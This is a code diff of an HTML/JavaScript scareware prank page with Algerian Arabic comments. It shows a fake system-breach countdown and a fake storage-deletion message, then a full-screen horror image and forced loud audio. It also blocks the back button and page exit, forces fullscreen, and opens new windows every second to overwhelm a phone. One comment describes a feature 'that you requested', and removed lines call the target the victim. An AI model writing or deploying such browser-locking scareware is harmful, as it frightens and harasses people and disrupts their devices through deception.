@@ -3,18 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SYSTEM_CRITICAL_LOCK</title>
+    <title>SYSTEM_CRITICAL_LOCK_V2</title>
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; cursor: none; }
         #horrorImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 9999; display: none; }
         #terminal { color: #f00; text-align: center; padding-top: 40vh; font-family: monospace; font-size: 25px; }
+        .blink { animation: blinker 0.2s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
 <body onclick="activateVirus()">
 
     <div id="terminal">
-        <div style="animation: blink 0.2s infinite;">⚠️ SYSTEM BREACH ⚠️</div>
-        <div id="count">10</div> <div style="font-size: 14px; color: #0ff;">DELETING_ROOT_DIRECTORY...</div>
+        <div class="blink">⚠️ SYSTEM BREACH DETECTED ⚠️</div>
+        <div id="count">10</div> 
+        <div style="font-size: 14px; color: #0ff;">DELETING_INTERNAL_STORAGE...</div>
     </div>
 
     <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
@@ -24,25 +27,17 @@
         let seconds = 10;
         let running = false;
         const audio = document.getElementById('sfx');
+        const img = document.getElementById('horrorImg');
 
-        // منع زر الرجوع سواسوة
+        // منع الرجوع سواسوة
         history.pushState(null, null, location.href);
         window.onpopstate = () => history.go(1);
-
-        // ميزة إجبار الصوت: إذا حبس عاود شعلو سواسوة
-        audio.onpause = () => { if(running) audio.play(); };
-
-        // ميزة إعادة الدخول التلقائي: كل ما يخرج الضحية نرجعوه سواسوة
-        document.addEventListener("visibilitychange", () => {
-            if (document.visibilityState === 'visible' && running) {
-                audio.play();
-                alert("⚠️ طفي كراك.. راك محبوس سواسوة!");
-            }
-        });
 
         function activateVirus() {
             if (running) return;
             running = true;
+            
+            // طلب الشاشة الكاملة سواسوة
             document.documentElement.requestFullscreen().catch(() => {});
             
             let timer = setInterval(() => {
@@ -57,16 +52,24 @@
 
         function bombardSystem() {
             document.getElementById('terminal').style.display = 'none';
-            document.getElementById('horrorImg').style.display = 'block';
+            img.style.display = 'block';
             audio.volume = 1.0;
             audio.play();
 
-            // اللاق اللانهائي: فتح نوافذ جديدة لمنع إغلاق كروم سواسوة
+            // الميزة لي طلبتها: تحديث وفتح تبويبات كل ثانية سواسوة
             setInterval(() => {
-                alert("طفي كراك.. النظام مات سواسوة!");
-                window.open(window.location.href, '_blank'); // فتح تبويب جديد سواسوة
+                // فتح صفحة جديدة لإرباك التيليفون سواسوة
+                window.open(window.location.href, '_blank', 'width=10,height=10');
+                
+                // إعادة تشغيل الصوت إذا حبس سواسوة
                 if(audio.paused) audio.play();
-            }, 200);
+                
+                // تنبيه لإجبار المستخدم على التفاعل سواسوة
+                console.log("Hacked by Alge-Hacker...");
+            }, 1000); 
+
+            // منع الخروج سواسوة
+            window.onbeforeunload = () => { return "راك محبوس سواسوة!"; };
         }
     </script>
 </body>
